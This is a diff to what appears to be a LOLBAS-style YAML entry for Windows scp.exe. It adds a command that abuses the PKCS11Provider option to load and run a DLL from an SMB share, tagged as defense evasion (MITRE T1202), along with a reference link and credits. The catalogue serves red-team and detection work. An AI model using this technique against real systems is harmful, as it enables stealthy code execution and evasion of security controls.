@@ -22,14 +22,27 @@ Commands:
     OperatingSystem: Windows 10, Windows 11
     Tags:
       - Execute: CMD
+  - Command: scp -o PKCS11Provider="\\127.0.0.1\Temp\Example.dll" . wind@github.com:.
+    Description: Executes a DLL from an SMB share by abusing the PKCS11Provider option. The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature termination by `scp.exe`.
+    Usecase: Performs indirect execution of a specified DLL from a remote share, can be used for defense evasion.
+    Category: Execute
+    Privileges: User
+    MitreID: T1202
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: DLL
+      - Execute: Remote    
 Full_Path:
   - Path: C:\Windows\System32\OpenSSH\scp.exe
 Detection:
   - IOC: "`scp.exe` executions referencing `ProxyCommand`."
 Resources:
   - Link: https://gtfobins.org/gtfobins/scp/
+  - Link: https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9  
 Acknowledgement:
   - Person: BinFault
     Handle: '@binfault'
   - Person: 'Nir Chako (Pentera)'
     Handle: '@C_h4ck_0'
+  - Person: Edo Maland
+    Handle: '@screetsec'
